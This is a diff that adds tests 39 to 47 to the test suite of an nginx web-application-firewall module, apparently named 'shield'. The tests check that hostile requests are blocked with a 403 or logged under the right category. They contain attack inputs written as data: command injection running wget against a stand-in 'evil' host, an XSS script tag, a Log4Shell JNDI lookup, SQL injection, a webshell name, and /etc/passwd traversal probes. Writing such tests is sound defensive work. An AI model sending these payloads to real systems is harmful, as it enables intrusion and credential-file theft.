@@ -292,3 +292,92 @@ GET /t?f=/etc/passwd%u0000.png
 --- request
 GET /t?f=%25%32%65%25%32%65/etc/passwd
 --- error_code: 403
+
+=== TEST 39: cmdi still blocks in the request target
+# TESTS 39-42: the body-unsafe categories keep FULL strength in the request
+# target and the scanned headers. NGX_HTTP_SHIELD_NO_BODY narrows WHERE a
+# category applies, never whether it matches.
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?cmd=;wget%20http://evil/x
+--- error_code: 403
+
+=== TEST 40: xss still blocks in the request target
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?q=<script>alert(1)</script>
+--- error_code: 403
+
+=== TEST 41: Log4Shell still blocks in the User-Agent
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t
+--- more_headers
+User-Agent: ${jndi:ldap://evil/x}
+--- error_code: 403
+
+=== TEST 42: a sensitive-file probe still blocks in the request target
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?file=/etc/passwd
+--- error_code: 403
+
+=== TEST 43: sqli is still scanned in the body
+# The body scan keeps the categories whose tokens are attack-only in ANY
+# position. Classic form-POST SQL injection is exactly what it is for.
+--- config
+    location /t { shield block; shield_body on; empty_gif; }
+--- request
+POST /t
+q=1 union select password from users
+--- more_headers
+Content-Type: application/x-www-form-urlencoded
+--- error_code: 403
+
+=== TEST 44: a webshell name is still scanned in the body
+# ssi and webshell were BOTH nearly marked body-unsafe, and both classifications
+# were wrong. Their signatures are not code a body legitimately carries: the ssi
+# set is three SSI directives (and stored-SSI injection is delivered in a body --
+# t/04 TEST 13 pins that), and the webshell set is malware NAMES (c99.php,
+# weevely, antsword). Nothing benign posts those.
+--- config
+    location /t { shield block; shield_body on; empty_gif; }
+--- request
+POST /t
+payload=antsword&target=/uploads/shell.jsp
+--- more_headers
+Content-Type: application/x-www-form-urlencoded
+--- error_code: 403
+
+=== TEST 45: a traversal TARGET is reported as sensitive_file, not traversal
+# The traversal category owns the GADGET ("../", "..%2f"). The filename the
+# gadget reaches for is a sensitive_file. They were both in the traversal table,
+# which meant the filename could not be exempted from the body scan without also
+# exempting "../" -- so a docs body that merely NAMED /etc/passwd was blocked.
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?f=/etc/passwd
+--- error_code: 403
+--- error_log
+category=sensitive_file
+
+=== TEST 46: the traversal gadget is still reported as traversal
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?f=../../../../var/log
+--- error_code: 403
+--- error_log
+category=traversal
+
+=== TEST 47: a full traversal-to-/etc/passwd is still blocked
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?f=../../../../etc/passwd
+--- error_code: 403
